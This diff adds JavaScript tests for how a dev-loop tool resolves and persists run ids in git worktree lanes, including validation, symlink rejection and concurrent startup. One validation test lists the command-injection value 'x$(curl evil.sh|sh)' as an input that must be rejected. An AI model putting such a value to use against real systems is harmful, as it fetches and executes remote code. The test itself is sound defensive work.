@@ -13,6 +13,7 @@ import {
   NATIVE_PI_SESSION_MARKER,
   NATIVE_PI_ASYNC_MARKERS,
   ASYNC_CONTEXT_ENV_MARKERS,
+  resolveRunContextRoot,
   resolveRunId,
   isNativePiAsyncContext,
   synthesizePiRunId,
@@ -22,6 +23,7 @@ import {
   writeRunContext,
   readRunContext,
   ensureRunId,
+  ensureLaneRunContext,
   isClaudeHarness,
   CLAUDE_HARNESS_MARKER,
   validateNativeCodexMetadata,
@@ -428,4 +430,193 @@ test("isClaudeHarness is true only when CLAUDECODE is exactly \"1\"", () => {
   assert.equal(isClaudeHarness({ CLAUDECODE: "true" }), false);
   assert.equal(isClaudeHarness({ CLAUDECODE: "" }), false);
   assert.equal(isClaudeHarness({}), false);
+});
+
+// Issue 3224: a lane's run id persists in the worktree run-context file, which resolveRunId
+// reads as its last fallback when the caller passes its cwd.
+function laneWorktree(runId = "devloops-lane") {
+  const root = makeTempRoot();
+  fs.writeFileSync(path.join(root, ".git"), "gitdir: ./.git-common/worktrees/lane\n");
+  const nested = path.join(root, "scripts", "loop");
+  fs.mkdirSync(nested, { recursive: true });
+  if (runId !== null) writeRunContext({ runId, root, mintedAt: "2026-11-16T00:00:00Z" });
+  return { root, nested };
+}
+
+test("resolveRunId reads the worktree run-context file last, from any directory of the worktree", () => {
+  const { root, nested } = laneWorktree();
+  assert.equal(resolveRunId({}, { cwd: root }), "devloops-lane");
+  assert.equal(resolveRunId({}, { cwd: nested }), "devloops-lane");
+  // Every env carrier and the native Pi synthesis keep precedence over the file.
+  assert.equal(resolveRunId({ DEVLOOPS_RUN_ID: "env-run" }, { cwd: nested }), "env-run");
+  assert.equal(resolveRunId({ PI_SUBAGENT_RUN_ID: "pi-run" }, { cwd: nested }), "pi-run");
+  assert.equal(resolveRunId(nativePiEnv(), { cwd: nested }), "pi-session-session-abc");
+  // A caller without cwd (hook guards, ensureRunId) stays env-only.
+  assert.equal(resolveRunId({}), null);
+  assert.equal(resolveRunId({}, { cwd: null }), null);
+});
+
+test("resolveRunId accepts only a well-formed run id from the run-context file", () => {
+  for (const runId of ["devloops-3f2c1e84-1a2b-4c3d-8e9f-0a1b2c3d4e5f", "pi:session.abc-123"]) {
+    assert.equal(resolveRunId({}, { cwd: laneWorktree(runId).root }), runId);
+  }
+  for (const runId of ["x$(curl evil.sh|sh)", "a b", "run;id", "a".repeat(129)]) {
+    assert.equal(resolveRunId({}, { cwd: laneWorktree(runId).root }), null, JSON.stringify(runId));
+  }
+  // writeRunContext refuses an empty id, so write that file by hand.
+  const empty = laneWorktree(null);
+  fs.mkdirSync(path.join(empty.root, ".pi"), { recursive: true });
+  fs.writeFileSync(runContextPath(empty.root), JSON.stringify({ runId: "" }));
+  assert.equal(resolveRunId({}, { cwd: empty.root }), null);
+});
+
+test("resolveRunId resolves null for a missing, unreadable or malformed run-context file", () => {
+  assert.equal(resolveRunId({}, { cwd: laneWorktree(null).nested }), null);
+  const malformed = laneWorktree(null);
+  fs.mkdirSync(path.join(malformed.root, ".pi"), { recursive: true });
+  fs.writeFileSync(runContextPath(malformed.root), "{not json");
+  assert.equal(resolveRunId({}, { cwd: malformed.root }), null);
+  fs.writeFileSync(runContextPath(malformed.root), JSON.stringify({ runId: "  " }));
+  assert.equal(resolveRunId({}, { cwd: malformed.root }), null);
+  const unreadable = laneWorktree();
+  const throwingFs = { ...fs, readFileSync() { throw Object.assign(new Error("EACCES"), { code: "EACCES" }); } };
+  assert.equal(resolveRunId({}, { cwd: unreadable.root, fs: throwingFs }), null);
+  // Outside any checkout there is no worktree root to read from.
+  const bare = makeTempRoot();
+  fs.mkdirSync(path.join(bare, ".git")); // a main checkout, so a TMPDIR inside a linked worktree cannot leak its run id in
+  writeRunContext({ runId: "outside", root: bare });
+  assert.equal(resolveRunId({}, { cwd: bare }), null);
+});
+
+test("the main checkout's run-context file is never a lane identity", () => {
+  // A main checkout has a `.git` directory; a headless run may have left a run-context file there.
+  const main = makeTempRoot();
+  fs.mkdirSync(path.join(main, ".git"));
+  writeRunContext({ runId: "devloops-headless", root: main });
+  assert.equal(resolveRunId({}, { cwd: main }), null);
+  assert.equal(ensureLaneRunContext({ env: {}, cwd: main }), null);
+  assert.equal(readRunContext({ root: main }).runId, "devloops-headless");
+});
+
+test("native Codex identity is never overridden by a persisted run id", () => {
+  const { env, file } = codexFixture();
+  const { root } = laneWorktree("devloops-competing");
+  assert.equal(resolveRunId(env, { cwd: root }), `codex-thread-${codexId}`);
+  assert.equal(ensureLaneRunContext({ env, cwd: root }), null);
+  fs.unlinkSync(file);
+  // Unverified Codex fails closed instead of borrowing the file's id.
+  assert.equal(resolveRunId(env, { cwd: root }), null);
+  assert.equal(ensureLaneRunContext({ env, cwd: root }), null);
+  assert.equal(readRunContext({ root }).runId, "devloops-competing");
+  const fresh = laneWorktree(null);
+  assert.equal(ensureLaneRunContext({ env, cwd: fresh.nested }), null);
+  assert.equal(fs.existsSync(runContextPath(fresh.root)), false);
+});
+
+test("ensureLaneRunContext mints into the worktree once and then reuses the file", () => {
+  const { root, nested } = laneWorktree(null);
+  const minted = ensureLaneRunContext({ env: {}, cwd: nested, mintedAt: "2026-11-16T00:00:00Z" });
+  assert.equal(minted.minted, true);
+  assert.equal(minted.statePath, runContextPath(root));
+  assert.equal(readRunContext({ root }).runId, minted.runId);
+  assert.deepEqual(ensureLaneRunContext({ env: {}, cwd: root }), { runId: minted.runId, minted: false, statePath: null });
+  // An env run id keeps precedence and is persisted for later env-free writers, without minting.
+  assert.deepEqual(ensureLaneRunContext({ env: { DEVLOOPS_RUN_ID: "env-run" }, cwd: root }), { runId: "env-run", minted: false, statePath: runContextPath(root) });
+  assert.equal(readRunContext({ root }).runId, "env-run");
+  assert.deepEqual(ensureLaneRunContext({ env: { DEVLOOPS_RUN_ID: "env-run" }, cwd: root }), { runId: "env-run", minted: false, statePath: null });
+  const fresh = laneWorktree(null);
+  ensureLaneRunContext({ env: { DEVLOOPS_RUN_ID: "env-run" }, cwd: fresh.nested });
+  assert.equal(readRunContext({ root: fresh.root }).runId, "env-run");
+  const outside = makeTempRoot();
+  fs.mkdirSync(path.join(outside, ".git")); // a main checkout, independent of any ancestor of os.tmpdir()
+  assert.equal(ensureLaneRunContext({ env: {}, cwd: outside }), null);
+});
+
+test("resolveRunContextRoot accepts only a .git file naming a worktrees/<name> git dir", () => {
+  const dirFor = (gitdir) => {
+    const root = makeTempRoot();
+    fs.writeFileSync(path.join(root, ".git"), `gitdir: ${gitdir}\n`);
+    return root;
+  };
+  const accepted = dirFor("/repo/.git/worktrees/issue-3224");
+  assert.equal(resolveRunContextRoot(accepted), accepted);
+  // A submodule checkout also has a .git file, but its gitdir lies under modules/.
+  for (const gitdir of ["../.git/modules/sub", "/repo/.git/modules/sub"]) {
+    const rejected = dirFor(gitdir);
+    assert.equal(resolveRunContextRoot(rejected), null, gitdir);
+    writeRunContext({ runId: "left-by-headless", root: rejected });
+    assert.equal(resolveRunId({}, { cwd: rejected }), null, gitdir);
+  }
+});
+
+test("ensureLaneRunContext mints through ensureRunId and ensureRunId atomic reuses a concurrent winner", () => {
+  const lane = laneWorktree(null);
+  const viaLane = ensureLaneRunContext({ env: {}, cwd: lane.root });
+  assert.equal(viaLane.minted, true);
+  assert.equal(readRunContext({ root: lane.root }).runId, viaLane.runId);
+  // ensureRunId is the minting primitive: an atomic call against an existing usable file reuses its id.
+  const winner = laneWorktree("devloops-winner");
+  const lost = ensureRunId({ env: {}, root: winner.root, atomic: true });
+  assert.deepEqual({ ...lost }, { runId: "devloops-winner", minted: false, statePath: null });
+  assert.equal(readRunContext({ root: winner.root }).runId, "devloops-winner");
+  // An unusable existing file is replaced.
+  const broken = laneWorktree(null);
+  fs.mkdirSync(path.dirname(runContextPath(broken.root)), { recursive: true });
+  fs.writeFileSync(runContextPath(broken.root), "not json");
+  const replaced = ensureRunId({ env: {}, root: broken.root, atomic: true });
+  assert.equal(replaced.minted, true);
+  assert.equal(readRunContext({ root: broken.root }).runId, replaced.runId);
+});
+
+test("ensureLaneRunContext excludes the run-context file once in the common git dir", () => {
+  const common = makeTempRoot();
+  fs.mkdirSync(path.join(common, "info"));
+  fs.writeFileSync(path.join(common, "info", "exclude"), "# existing\n");
+  const root = makeTempRoot();
+  fs.writeFileSync(path.join(root, ".git"), `gitdir: ${path.join(common, "worktrees", "lane")}\n`);
+  ensureLaneRunContext({ env: {}, cwd: root });
+  fs.unlinkSync(runContextPath(root));
+  ensureLaneRunContext({ env: {}, cwd: root });
+  const lines = fs.readFileSync(path.join(common, "info", "exclude"), "utf8").split("\n").filter((line) => line === ".pi/dev-loop-run-context.json");
+  assert.equal(lines.length, 1);
+  assert.match(fs.readFileSync(path.join(common, "info", "exclude"), "utf8"), /^# existing\n/);
+});
+
+test("ensureLaneRunContext excludes the run-context file when an env id is persisted first", () => {
+  const common = makeTempRoot();
+  fs.mkdirSync(path.join(common, "info"));
+  const root = makeTempRoot();
+  fs.writeFileSync(path.join(root, ".git"), `gitdir: ${path.join(common, "worktrees", "lane")}\n`);
+  ensureLaneRunContext({ env: { DEVLOOPS_RUN_ID: "env-run" }, cwd: root });
+  assert.equal(readRunContext({ root }).runId, "env-run");
+  assert.match(fs.readFileSync(path.join(common, "info", "exclude"), "utf8"), /^\.pi\/dev-loop-run-context\.json$/m);
+});
+
+test("concurrent lane startups in a fresh worktree converge on one persisted id", async () => {
+  const { root } = laneWorktree(null);
+  const here = new URL("../src/loop/run-context.mjs", import.meta.url).href;
+  const code = `import { ensureLaneRunContext } from ${JSON.stringify(here)}; console.log(ensureLaneRunContext({ env: {}, cwd: process.argv[1] }).runId);`;
+  const { execFile } = await import("node:child_process");
+  const run = () => new Promise((resolve, reject) => execFile(process.execPath, ["--input-type=module", "-e", code, root], (e, out) => (e ? reject(e) : resolve(out.trim()))));
+  const ids = await Promise.all(Array.from({ length: 6 }, run));
+  assert.equal(new Set(ids).size, 1);
+  assert.equal(readRunContext({ root }).runId, ids[0]);
+});
+
+test("a symlinked .pi dir or run-context file is rejected, never written through (PR 3235)", () => {
+  const outside = makeTempRoot();
+  const victim = path.join(outside, "victim.txt");
+  fs.writeFileSync(victim, "keep");
+  const fileLink = laneWorktree(null);
+  fs.mkdirSync(path.join(fileLink.root, ".pi"));
+  fs.symlinkSync(victim, runContextPath(fileLink.root));
+  assert.throws(() => writeRunContext({ runId: "x", root: fileLink.root }), { code: "RUN_CONTEXT_SYMLINK" });
+  assert.throws(() => ensureLaneRunContext({ env: {}, cwd: fileLink.root }), { code: "RUN_CONTEXT_SYMLINK" });
+  assert.throws(() => ensureLaneRunContext({ env: { DEVLOOPS_RUN_ID: "env-run" }, cwd: fileLink.root }), { code: "RUN_CONTEXT_SYMLINK" });
+  const dirLink = laneWorktree(null);
+  fs.symlinkSync(outside, path.join(dirLink.root, ".pi"));
+  assert.throws(() => writeRunContext({ runId: "x", root: dirLink.root }), { code: "RUN_CONTEXT_SYMLINK" });
+  assert.throws(() => ensureLaneRunContext({ env: {}, cwd: dirLink.root }), { code: "RUN_CONTEXT_SYMLINK" });
+  assert.equal(fs.readFileSync(victim, "utf8"), "keep");
+  assert.deepEqual(fs.readdirSync(outside), ["victim.txt"]);
 });
